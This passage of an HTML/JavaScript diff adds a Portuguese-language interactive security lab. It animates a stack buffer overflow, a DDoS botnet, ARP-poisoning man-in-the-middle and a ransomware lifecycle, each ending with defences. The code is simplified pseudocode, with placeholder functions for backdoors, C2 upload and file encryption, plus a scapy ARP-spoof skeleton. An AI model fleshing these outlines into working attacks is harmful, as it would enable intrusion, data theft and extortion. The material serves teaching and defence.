+code:[{t:'<span class="cm">// Função vulnerável em C</span>'},{t:'<span class="kw">void</span> <span class="fn">login</span>(<span class="kw">char</span>*<span class="var">in</span>){'},{t:'&nbsp;&nbsp;<span class="kw">char</span> <span class="var">buf</span>[<span class="num">16</span>]; <span class="cm">// 16 bytes</span>'},{t:'&nbsp;&nbsp;<span class="fn">strcpy</span>(<span class="var">buf</span>,<span class="var">in</span>); <span class="cm">// ❌ sem limite</span>'},{t:'}'},{t:''},{t:'<span class="cm">// Payload (28 bytes):</span>'},{t:'<span class="str">"AAAAAAAAAAAAAAAA"</span> <span class="cm">// 16B: buffer</span>'},{t:'<span class="str">+"\x41\x41\x41\x41"</span> <span class="cm">// 4B: EBP</span>'},{t:'<span class="str">+"\xef\xbe\xad\xde"</span> <span class="cm">// 4B: ret addr</span>'},{t:'+ <span class="var">shellcode</span>'},{t:''},{t:'<span class="cm">// ✅ strncpy + ASLR + DEP</span>'},{t:'<span class="fn">strncpy</span>(<span class="var">buf</span>,<span class="var">in</span>,<span class="kw">sizeof</span>(<span class="var">buf</span>)-<span class="num">1</span>);'}],
+steps:[
+{lines:[2,3,4],hl:'hl-amber',lbl:'FUNÇÃO VULNERÁVEL',cls:'warn',txt:'buffer tem 16 bytes e strcpy não verifica o tamanho. Mais de 16 bytes escreve em áreas adjacentes da memória.'},
+{lines:[2,3],hl:'hl-green',lbl:'NORMAL',cls:'',txt:'Input legítimo (8 chars): cabe no buffer. EBP e endereço de retorno intactos.'},
+{lines:[7,8],hl:'hl-amber',lbl:'BUFFER CHEIO',cls:'warn',txt:'16 bytes de A preenchem exatamente o buffer. Próximo byte já invade área do EBP.'},
+{lines:[8,9],hl:'hl-red',lbl:'EBP CORROMPIDO',cls:'danger',txt:'4 bytes extras sobrescrevem o EBP salvo. Programa perde referência da pilha.'},
+{lines:[9,10,11],hl:'hl-red',lbl:'RETORNO HIJACKED',cls:'danger',txt:'4 bytes finais sobrescrevem o endereço de retorno. Função salta para o shellcode. Execução arbitrária.'},
+{lines:[13,14],hl:'hl-green',lbl:'DEFESA',cls:'info',txt:'strncpy limita a cópia. ASLR randomiza endereços. DEP torna pilha não-executável. Stack Canaries detectam overflow.'}],
+initV(){document.getElementById('algo-vis').innerHTML=`<span class="vis-lbl">// STACK //</span><div class="mem-tbl"><span class="mem-addr">ret</span><div class="mem-cv" id="mc-r">endereço retorno</div><span class="mem-addr">EBP</span><div class="mem-cv" id="mc-e">EBP salvo</div><span class="mem-addr">buf</span><div class="mem-cv" id="mc-b">buffer[16]: vazio</div></div><div class="mbytes" id="mbs">${Array(20).fill(0).map((_,i)=>`<div class="mb" id="mb${i}">00</div>`).join('')}</div><div class="exp-box" id="be2"><span class="exp-lbl">AGUARDANDO</span>Clique ▶ para iniciar.</div>`;},
+updV(s){
+  const e=document.getElementById('be2');if(e){e.className='exp-box'+(this.steps[s].cls?' '+this.steps[s].cls:'');e.innerHTML=`<span class="exp-lbl">${this.steps[s].lbl}</span>${this.steps[s].txt}`;}
+  for(let i=0;i<20;i++){const m=document.getElementById('mb'+i);if(m){m.className='mb';m.textContent='00';}}
+  const r=document.getElementById('mc-r'),eb=document.getElementById('mc-e'),b=document.getElementById('mc-b');if(!r)return;
+  r.className='mem-cv';r.textContent='endereço retorno';eb.className='mem-cv';eb.textContent='EBP salvo';b.className='mem-cv';b.textContent='buffer[16]: vazio';
+  if(s===1){for(let i=0;i<8;i++){const m=document.getElementById('mb'+i);if(m){m.className='mb mb-ok';m.textContent='75';}}b.className='mem-cv mc-ok';b.textContent='buffer: "usuario1" ✅';}
+  if(s===2){for(let i=0;i<16;i++){const m=document.getElementById('mb'+i);if(m){m.className='mb mb-ok';m.textContent='41';}}b.className='mem-cv mc-warn';b.textContent='CHEIO ⚠️';}
+  if(s===3){for(let i=0;i<16;i++){const m=document.getElementById('mb'+i);if(m){m.className='mb mb-ok';m.textContent='41';}}for(let i=16;i<20;i++){const m=document.getElementById('mb'+i);if(m){m.className='mb mb-over';m.textContent='41';}}b.className='mem-cv mc-warn';eb.className='mem-cv mc-over';eb.textContent='EBP: CORROMPIDO! ⚠️';}
+  if(s===4){for(let i=0;i<16;i++){const m=document.getElementById('mb'+i);if(m){m.className='mb mb-ok';m.textContent='41';}}for(let i=16;i<20;i++){const m=document.getElementById('mb'+i);if(m){m.className='mb mb-over';m.textContent='41';}}eb.className='mem-cv mc-over';eb.textContent='EBP: CORROMPIDO!';r.className='mem-cv mc-inj';r.textContent='→ SHELLCODE 💀';}
+  if(s===5){for(let i=0;i<16;i++){const m=document.getElementById('mb'+i);if(m){m.className='mb mb-ok';m.textContent='41';}}b.className='mem-cv mc-ok';b.textContent='buffer: protegido ✅';eb.className='mem-cv mc-ok';eb.textContent='EBP: intacto ✅';r.className='mem-cv mc-ok';r.textContent='retorno: original ✅';}
+}},
+ddos:{title:'DDoS / Botnet',fname:'ddos.py',
+code:[{t:'<span class="cm"># C2 — Command & Control</span>'},{t:'<span class="var">botnet</span>=[]'},{t:''},{t:'<span class="kw">def</span> <span class="fn">infect</span>(<span class="var">host</span>):'},{t:'&nbsp;&nbsp;<span class="fn">install_backdoor</span>(<span class="var">host</span>)'},{t:'&nbsp;&nbsp;<span class="var">botnet</span>.<span class="fn">append</span>(<span class="var">host</span>)'},{t:''},{t:'<span class="kw">def</span> <span class="fn">flood</span>(<span class="var">target</span>):'},{t:'&nbsp;&nbsp;<span class="kw">while</span> <span class="kw">True</span>:'},{t:'&nbsp;&nbsp;&nbsp;&nbsp;<span class="var">s</span>.<span class="fn">connect</span>(<span class="var">target</span>)'},{t:'&nbsp;&nbsp;&nbsp;&nbsp;<span class="var">s</span>.<span class="fn">send</span>(<span class="str">b"GET /"</span>*<span class="num">9999</span>)'},{t:''},{t:'<span class="kw">def</span> <span class="fn">launch</span>(<span class="var">target</span>):'},{t:'&nbsp;&nbsp;<span class="kw">for</span> <span class="var">bot</span> <span class="kw">in</span> <span class="var">botnet</span>:'},{t:'&nbsp;&nbsp;&nbsp;&nbsp;<span class="fn">Thread</span>(<span class="var">target</span>=<span class="fn">flood</span>).<span class="fn">start</span>()'}],
+steps:[
+{lines:[],hl:'',lbl:'CENÁRIO',cls:'',txt:'DDoS usa milhares de dispositivos comprometidos para sobrecarregar um alvo. Controlados via servidor C2.'},
+{lines:[3,4,5,6],hl:'hl-red',lbl:'RECRUTAMENTO',cls:'warn',txt:'Malware instala backdoor silencioso. CPU e rede normais para o dono. Câmeras IP e roteadores são alvos fáceis.'},
+{lines:[3,4,5,6],hl:'hl-red',lbl:'PROPAGAÇÃO',cls:'danger',txt:'Bot se replica buscando dispositivos vulneráveis. Em horas, centenas são recrutados.'},
+{lines:[7,8,9,10,11],hl:'hl-red',lbl:'FLOOD',cls:'danger',txt:'Loop infinito: abre conexões e envia requisições gigantes. Um bot gera centenas de conexões/segundo.'},
+{lines:[12,13,14,15],hl:'hl-red',lbl:'ATAQUE LANÇADO',cls:'danger',txt:'Todos os zumbis disparam simultaneamente. Servidor não distingue legítimo do malicioso — cai.'},
+{lines:[],hl:'',lbl:'DEFESA',cls:'info',txt:'CDN + Scrubbing Centers filtram o tráfego antes de chegar ao servidor. Rate limiting bloqueia IPs abusivos.'}],
+initV(){document.getElementById('algo-vis').innerHTML=`<span class="vis-lbl">// BOTNET //</span><div class="bot-grid">${Array(24).fill(0).map((_,i)=>`<div class="bot b-idle" id="bt${i}">💻</div>`).join('')}</div><div class="net-row"><div class="nnode" id="dt">🎯 Alvo</div></div><div class="load-lbl" id="dl">Carga: 0%</div><div class="prog-t"><div class="prog-f" id="db" style="width:0%;background:var(--red)"></div></div><div class="exp-box" id="de"><span class="exp-lbl">AGUARDANDO</span>Clique ▶ para iniciar.</div>`;},
+updV(s){
+  const e=document.getElementById('de');if(e){e.className='exp-box'+(this.steps[s].cls?' '+this.steps[s].cls:'');e.innerHTML=`<span class="exp-lbl">${this.steps[s].lbl}</span>${this.steps[s].txt}`;}
+  if(labTmr){clearInterval(labTmr);labTmr=null;}
+  for(let i=0;i<24;i++){const b=document.getElementById('bt'+i);if(b)b.className='bot b-idle';}
+  const tgt=document.getElementById('dt'),bar=document.getElementById('db'),lbl=document.getElementById('dl');
+  if(!tgt)return;tgt.className='nnode';bar.style.width='0%';bar.style.background='var(--red)';if(lbl)lbl.textContent='Carga: 0%';
+  if(s===1){for(let i=0;i<6;i++){const b=document.getElementById('bt'+i);if(b)b.className='bot b-inf';}}
+  if(s===2){for(let i=0;i<18;i++){const b=document.getElementById('bt'+i);if(b)b.className='bot b-inf';}}
+  if(s===3){for(let i=0;i<18;i++){const b=document.getElementById('bt'+i);if(b)b.className='bot b-fire';}tgt.className='nnode nn-atk';bar.style.width='55%';if(lbl)lbl.textContent='Carga: 55% ⚠️';}
+  if(s===4){for(let i=0;i<18;i++){const b=document.getElementById('bt'+i);if(b)b.className='bot b-fire';}tgt.className='nnode nn-atk';
+    let ld=55;labTmr=setInterval(()=>{ld=Math.min(100,ld+Math.random()*4);if(bar)bar.style.width=ld+'%';if(lbl)lbl.textContent='Carga: '+Math.round(ld)+'%'+(ld>90?' ⚠️ FORA DO AR!':' ⚠️');},400);}
+  if(s===5){for(let i=0;i<18;i++){const b=document.getElementById('bt'+i);if(b)b.className='bot b-idle';}tgt.className='nnode nn-def';bar.style.width='8%';bar.style.background='var(--green)';if(lbl)lbl.textContent='✅ Filtrado — protegido';}
+}},
+mitm:{title:'Man in the Middle',fname:'mitm_arp.py',
+code:[{t:'<span class="cm"># ARP Poisoning</span>'},{t:'<span class="kw">from</span> <span class="var">scapy</span>.<span class="var">all</span> <span class="kw">import</span> *'},{t:''},{t:'<span class="kw">def</span> <span class="fn">poison</span>(<span class="var">victim</span>,<span class="var">gw</span>):'},{t:'&nbsp;&nbsp;<span class="var">pkt</span>=<span class="fn">ARP</span>(<span class="var">op</span>=<span class="num">2</span>,'},{t:'&nbsp;&nbsp;&nbsp;&nbsp;<span class="var">pdst</span>=<span class="var">victim</span>, <span class="cm"># para vítima</span>'},{t:'&nbsp;&nbsp;&nbsp;&nbsp;<span class="var">psrc</span>=<span class="var">gw</span>,    <span class="cm"># "sou o gateway"</span>'},{t:'&nbsp;&nbsp;&nbsp;&nbsp;<span class="var">hwsrc</span>=<span class="var">atk_mac</span>)'},{t:'&nbsp;&nbsp;<span class="fn">send</span>(<span class="var">pkt</span>)'},{t:''},{t:'<span class="kw">def</span> <span class="fn">intercept</span>(<span class="var">pkt</span>):'},{t:'&nbsp;&nbsp;<span class="fn">capturar</span>(<span class="var">pkt</span>[<span class="var">Raw</span>].<span class="var">load</span>)'},{t:'&nbsp;&nbsp;<span class="fn">repassar</span>(<span class="var">pkt</span>)'},{t:''},{t:'<span class="fn">sniff</span>(<span class="var">prn</span>=<span class="fn">intercept</span>)'}],
+steps:[
+{lines:[],hl:'',lbl:'CENÁRIO',cls:'',txt:'ARP não tem autenticação — qualquer um pode enviar respostas falsas e redirecionar o tráfego da rede local.'},
+{lines:[3,4,5,6,7,8,9],hl:'hl-amber',lbl:'ARP POISONING',cls:'warn',txt:'Envia ARP falso para a vítima ("o gateway está no meu MAC") e para o gateway ("a vítima está no meu MAC").'},
+{lines:[10,11,12,13],hl:'hl-red',lbl:'ATACANTE NO MEIO',cls:'danger',txt:'Todo tráfego passa pelo atacante. Comunicação parece normal para os dois lados, mas o atacante lê tudo.'},
+{lines:[10,11,12,13],hl:'hl-red',lbl:'CAPTURA ATIVA',cls:'danger',txt:'Senhas, cookies, dados bancários — visíveis em texto claro. Pode modificar os dados antes de repassar.'},
+{lines:[],hl:'',lbl:'DEFESA',cls:'info',txt:'HTTPS/TLS criptografa — dados interceptados são ilegíveis. HSTS impede SSL Stripping. VPN cria túnel criptografado.'}],
+initV(){document.getElementById('algo-vis').innerHTML=`<span class="vis-lbl">// FLUXO //</span><div class="net-row"><div class="nnode nn-ok">💻 Cliente</div><div class="narr" id="ma1">→</div><div class="nnode" id="mat">👤 ?</div><div class="narr" id="ma2">→</div><div class="nnode nn-ok">🌐 Servidor</div></div><div class="pkt-list" id="mp"></div><div class="exp-box" id="me"><span class="exp-lbl">AGUARDANDO</span>Clique ▶ para iniciar.</div>`;},
+updV(s){
+  const e=document.getElementById('me');if(e){e.className='exp-box'+(this.steps[s].cls?' '+this.steps[s].cls:'');e.innerHTML=`<span class="exp-lbl">${this.steps[s].lbl}</span>${this.steps[s].txt}`;}
+  const at=document.getElementById('mat'),a1=document.getElementById('ma1'),a2=document.getElementById('ma2'),pk=document.getElementById('mp');
+  if(!at)return;at.className='nnode';at.textContent='👤 ?';a1.className='narr';a1.textContent='→';a2.className='narr';a2.textContent='→';if(pk)pk.innerHTML='';
+  if(s===1){at.className='nnode nn-atk';at.textContent='⚠️ Atacante';if(pk)pk.innerHTML='<div class="pkt pkt-int"><span>ARP: Gateway→MAC do atacante (FALSO)</span></div>';}
+  if(s>=2){at.className='nnode nn-mid';at.textContent='👤 ATACANTE';a1.className='narr na-atk';a2.className='narr na-atk';}
+  if(s===3&&pk){pk.innerHTML=[['POST /login — user=joao&pass=123','CAPTURADO'],['Cookie: session=a3f9b2c1','CAPTURADO'],['GET /saldo → R$45k → R$0','ALTERADO']].map(([d,st])=>`<div class="pkt pkt-int"><span>${d}</span><span style="font-size:0.58rem;color:var(--red)">${st}</span></div>`).join('');}
+  if(s===4){at.className='nnode nn-def';at.textContent='🚫 Bloqueado';a1.className='narr na-blk';a1.textContent='🔒';a2.className='narr na-blk';a2.textContent='🔒';if(pk)pk.innerHTML='<div class="pkt"><span>TLS: dados criptografados ✅</span></div>';}
+}},
+ransom:{title:'Ransomware — Ciclo Completo',fname:'ransomware.py',
+code:[{t:'<span class="cm"># Ciclo do ransomware moderno</span>'},{t:''},{t:'<span class="cm"># 1. Infiltração</span>'},{t:'<span class="fn">install_backdoor</span>();<span class="fn">disable_AV</span>()'},{t:''},{t:'<span class="cm"># 2. Propagação lateral</span>'},{t:'<span class="kw">for</span> <span class="var">h</span> <span class="kw">in</span> <span class="fn">scan_network</span>():<span class="fn">lateral_move</span>(<span class="var">h</span>)'},{t:''},{t:'<span class="cm"># 3. Exfiltração (dupla extorsão)</span>'},{t:'<span class="kw">for</span> <span class="var">f</span> <span class="kw">in</span> <span class="fn">find_valuable</span>():<span class="fn">upload_c2</span>(<span class="var">f</span>)'},{t:''},{t:'<span class="cm"># 4. Criptografar</span>'},{t:'<span class="var">key</span>=<span class="fn">RSA_generate</span>(<span class="num">4096</span>)'},{t:'<span class="kw">for</span> <span class="var">f</span> <span class="kw">in</span> <span class="fn">get_all_files</span>():'},{t:'&nbsp;&nbsp;<span class="fn">AES_encrypt</span>(<span class="var">f</span>,<span class="var">key</span>)'},{t:'&nbsp;&nbsp;<span class="fn">rename</span>(<span class="var">f</span>,<span class="var">f</span>+<span class="str">".locked"</span>)'},{t:''},{t:'<span class="cm"># 5. Resgate</span>'},{t:'<span class="fn">drop_note</span>();<span class="fn">countdown</span>(<span class="num">72</span>)'}],
+_F:[{i:'📄',n:'relatorio.pdf'},{i:'📊',n:'vendas.xlsx'},{i:'🖼️',n:'logo.png'},{i:'📝',n:'contrato.doc'},{i:'💾',n:'backup.zip'},{i:'📧',n:'emails.pst'},{i:'🔑',n:'keys.txt'},{i:'📋',n:'dados.csv'},{i:'📁',n:'projetos'},{i:'🎥',n:'video.mp4'}],
+steps:[
+{lines:[],hl:'',lbl:'CENÁRIO',cls:'',txt:'Ransomware opera em fases silenciosas. A criptografia é a fase final — quando a vítima percebe, o atacante já tem tudo.'},
+{lines:[2,3,4],hl:'hl-red',lbl:'INFILTRAÇÃO',cls:'danger',txt:'Anexo malicioso, exploit ou senha fraca instala o dropper. Antivírus desativado imediatamente. Backdoor instalado.'},
+{lines:[5,6,7],hl:'hl-amber',lbl:'PROPAGAÇÃO',cls:'warn',txt:'Mapeia a rede, identifica servidores de backup e move-se lateralmente usando credenciais comprometidas.'},
+{lines:[8,9,10],hl:'hl-red',lbl:'DUPLA EXTORSÃO',cls:'danger',txt:'Antes de criptografar, envia dados para o C2. Dois motivos para pagar: recuperar dados E impedir publicação.'},
+{lines:[11,12,13,14,15,16],hl:'hl-red',lbl:'CRIPTOGRAFIA',cls:'danger',txt:'AES-256 por arquivo + RSA-4096 para as chaves. Sem a chave privada: matematicamente impossível descriptografar.'},
+{lines:[17,18,19],hl:'hl-red',lbl:'EXTORSÃO',cls:'danger',txt:'README_DECRYPT.txt em todas as pastas. Contador de 72h. Bitcoin. Site .onion lista vítimas que não pagaram.'},
+{lines:[],hl:'',lbl:'DEFESA — 3-2-1',cls:'info',txt:'3 cópias, 2 mídias diferentes, 1 offline. Backup offline não pode ser criptografado. Teste a restauração regularmente.'}],
+initV(){const F=this._F;document.getElementById('algo-vis').innerHTML=`<span class="vis-lbl">// SISTEMA DA VÍTIMA //</span><div class="file-grid">${F.map((f,i)=>`<div class="fitem" id="rf${i}"><span class="fi-icon">${f.i}</span>${f.n}</div>`).join('')}</div><div class="rn" id="rn" style="display:none"></div><div class="exp-box" id="re"><span class="exp-lbl">AGUARDANDO</span>Clique ▶ para iniciar.</div>`;},
+updV(s){
+  const F=this._F;const e=document.getElementById('re');if(e){e.className='exp-box'+(this.steps[s].cls?' '+this.steps[s].cls:'');e.innerHTML=`<span class="exp-lbl">${this.steps[s].lbl}</span>${this.steps[s].txt}`;}
+  if(labTmr){clearInterval(labTmr);labTmr=null;}
+  F.forEach((_,i)=>{const el=document.getElementById('rf'+i);if(el){el.className='fitem';el.style.opacity='1';el.innerHTML=`<span class="fi-icon">${F[i].i}</span>${F[i].n}`;}});
+  const n=document.getElementById('rn');if(n){n.style.display='none';n.style.borderColor='';n.style.color='';n.style.background='';}
+  if(s===3){[1,3,5,7].forEach(i=>{const el=document.getElementById('rf'+i);if(el)el.style.opacity='0.2';});}
+  if(s===4){let idx=0;labTmr=setInterval(()=>{if(idx>=F.length){clearInterval(labTmr);return;}const el=document.getElementById('rf'+idx);if(el){el.className='fitem fenc';setTimeout(()=>{if(el){el.className='fitem flocked';el.style.opacity='1';el.innerHTML=`<span class="fi-icon">🔒</span>${F[idx].n}.locked`;}},500);}idx++;},200);}
+  if(s===5&&n){n.style.display='block';n.innerHTML='💀 README_DECRYPT.txt<br><br>Pague 5 BTC (≈R$2.500.000)<br>⏱️ Prazo: 72:00:00';}
+  if(s===6&&n){F.forEach((_,i)=>{const el=document.getElementById('rf'+i);if(el){el.className='fitem';el.style.opacity='1';el.innerHTML=`<span class="fi-icon">${F[i].i}</span>${F[i].n}`;}});n.style.display='block';n.style.borderColor='var(--green)';n.style.color='var(--green)';n.style.background='rgba(0,255,136,0.04)';n.innerHTML='✅ BACKUP OFFLINE RESTAURADO — Resgate pago: R$0,00';}
+}}};
+
+function openAlgo(id){
+  curAlgo=id;curStep=0;
+  const a=ALGOS[id];
+  const at=document.getElementById('algo-title');if(at)at.textContent=a.title;
+  const af=document.getElementById('algo-fname');if(af)af.textContent=a.fname;
+  const ca=document.getElementById('algo-code');
+  if(ca)ca.innerHTML=a.code.map((l,i)=>`<div class="code-line" id="cl${i}"><span class="ln">${String(i+1).padStart(2,'0')}</span><span>${l.t}</span></div>`).join('');
+  a.initV();refreshAlgo();a.updV(0);
+  document.getElementById('lab-menu').style.display='none';
+  document.getElementById('lab-algo-view').style.display='block';
+}
+
+function closeAlgo(){
+  if(labTmr){clearInterval(labTmr);labTmr=null;}
+  document.getElementById('lab-algo-view').style.display='none';
+  document.getElementById('lab-menu').style.display='block';
+}
+
+function algoStep(dir){
+  const a=ALGOS[curAlgo];if(!a)return;
+  const ns=curStep+dir;if(ns<0||ns>=a.steps.length)return;
+  curStep=ns;if(labTmr){clearInterval(labTmr);labTmr=null;}
+  refreshAlgo();a.updV(curStep);
+}
+
+function algoReset(){
+  if(labTmr){clearInterval(labTmr);labTmr=null;}
+  curStep=0;const a=ALGOS[curAlgo];if(!a)return;
+  a.initV();refreshAlgo();a.updV(0);
+}
+
+function refreshAlgo(){
+  const a=ALGOS[curAlgo];if(!a)return;
+  const tot=a.steps.length-1;
+  const sn=document.getElementById('algo-snum');if(sn)sn.textContent=curStep+'/'+tot;
+  const sl=document.getElementById('algo-steps-lbl');if(sl)sl.textContent='PASSO '+curStep+'/'+tot;
+  const prev=document.getElementById('algo-prev');if(prev)prev.disabled=curStep===0;
+  const next=document.getElementById('algo-next');if(next)next.disabled=curStep===tot;
+  const st=a.steps[curStep];
+  a.code.forEach((_,i)=>{const el=document.getElementById('cl'+i);if(el)el.className='code-line'+(st.lines.includes(i+1)?' '+st.hl:'');});
+}
+
+window.openAlgo=openAlgo;window.closeAlgo=closeAlgo;window.algoStep=algoStep;window.algoReset=algoReset;
+
 </script>
 </body>
 </html>
